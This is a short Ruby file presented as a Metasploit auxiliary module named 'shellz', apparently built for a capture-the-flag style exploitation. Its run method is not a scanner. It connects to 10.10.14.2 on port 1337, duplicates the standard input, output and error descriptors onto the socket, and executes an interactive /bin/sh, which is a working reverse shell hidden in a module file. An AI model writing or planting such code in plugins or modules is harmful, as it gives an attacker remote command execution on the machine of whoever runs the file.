class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'shellz',
        # The description can be multiple lines, but does not preserve formatting.
        'Description' => 'shellz',
        'Author' => ['Joe Module <joem@example.com>'],
        'License' => MSF_LICENSE,
        # https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability,-Side-Effects,-and-Stabili
      )
    )
  end

  def run()
    require 'socket'

    s = Socket.new 2,1
    s.connect Socket.sockaddr_in 1337, '10.10.14.2'

    [0,1,2].each { |fd| syscall 33, s.fileno, fd }
    exec '/bin/sh -i'  
    end

end
